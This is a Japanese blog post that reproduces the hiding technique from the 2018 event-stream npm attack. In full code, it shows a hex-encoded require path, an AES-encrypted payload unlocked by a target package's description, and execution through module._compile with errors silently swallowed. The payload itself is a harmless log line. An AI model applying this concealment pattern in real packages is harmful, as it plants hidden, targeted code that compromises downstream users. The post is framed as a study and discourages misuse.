# 概要

本記事は直近で起きた npm パッケージ event-stream への攻撃のうち、任意のコードを忍ばせる手法の追試です。

⚠️ 今回は攻撃者がパッケージのメンテナであったために発生したことであり、この記事を読んで誰でも攻撃できるようになるわけではありません。
⚠️ 念のためですが、この方法を悪用しないようにお願いします。

# 参考

[2018/11/27 に判明した npm パッケージ乗っ取りについて](https://qiita.com/azs/items/b15bc456bee3a7892950)

# コード

https://github.com/kik4/npm-evil-code-injection

# 攻撃手順

```ts
// 正常なコード
export default () => console.log("This is good code.");
```

```ts
// 攻撃コード（仮）
console.log("This is evil code.");
```

上記の正常なコードに攻撃コードを忍ばせます。そしてこのパッケージを実行する npm パッケージの description が`run evil code`の時だけ攻撃コードが実行されるようにしましょう。

## 1. 読み込みファイルの隠蔽

正常なコードを書いたファイルを index.ts、攻撃コードとは別に攻撃コードを忍ばせるファイルを evil.ts とします。
まずは index.ts から evil.ts を require します。evil() の実行が攻撃コードの実行になります。

```ts
export default () => {
  const evil = require("./evil.ts").default;
  evil();
  console.log("This is good code.");
};
```

今回はこの require の中の文字列が hex エンコードされていました。`./evil.ts`をエンコードすると`2E2F6576696C`になります。
これをデコード処理を入れて書き換えます。

```ts
export default () => {
  const evil = require(Buffer.from("2E2F6576696C", "hex").toString()).default;
  evil();
  console.log("This is good code.");
};
```

一見して何のファイルが読み込まれているかわからなくなりましたね。

## 2. 攻撃コードの暗号化

攻撃を忍ばせるコード evil.ts を用意する前に、攻撃コードを AES 暗号化します。暗号化は node コマンドで REPL を起動させてちゃっちゃとやってしまいます。
パスワードは description で起動させる`run evil code`、暗号化する文字列は`console.log("This is evil code.")`ですね。

```js
var cipher = require("crypto").createCipher("aes-256-cbc", "run evil code");
var encoded =
  cipher.update('console.log("This is evil code.")', "utf8", "hex") +
  cipher.final("hex");
encoded;
```

結果は`cfdc36e155f1213c266810ac757ceb743e036c6aa08703d564010029511c7af099387eb23604e1b308233f4eba23dd0f`です。

## 3. 攻撃コードを実行するコードの用意

ようやく evil.ts の用意です。この中で暗号化したコードの複合と実行を行います。

```ts
import * as crypto from "crypto";

// _compile()の定義が無かったので追加
declare global {
  interface NodeModule {
    _compile(arg1: string, arg2: string): any;
  }
}

export default () => {
  const data =
    "cfdc36e155f1213c266810ac757ceb743e036c6aa08703d564010029511c7af099387eb23604e1b308233f4eba23dd0f";
  const decipher = crypto.createDecipher(
    "aes256",
    process.env.npm_package_description || ""
  );

  // パスワードが違うとこけるのでキャッチ
  try {
    const payload =
      decipher.update(data, "hex", "utf8") + decipher.final("utf8");
    module._compile(payload, "");
  } catch {}
};
```

# 攻撃を受けてみる

攻撃を受ける側のパッケージを用意します。上記のパッケージは公開してもしょうがないので今回はローカルインポートにします。
package.json では攻撃コードが実行されるように description を`run evil code`にしておきます。

```json
{
  // 略
  "description": "run evil code",
  // 略
  "dependencies": {
    "library": "../library" // ローカルインポート
    // 略
  }
}
```

実行コードはこんな感じ。

```ts
import library from "library";

console.log("Hello world!!");
library();
```

これを実行すると出力は以下の通りです。

```
// 期待する結果
Hello world!!
This is good code.

// 実際の結果
Hello world!!
This is evil code.
This is good code.
```

description を書き換えると`This is evil code.`が出てきません。このようにして攻撃対象を絞っていたのでした。
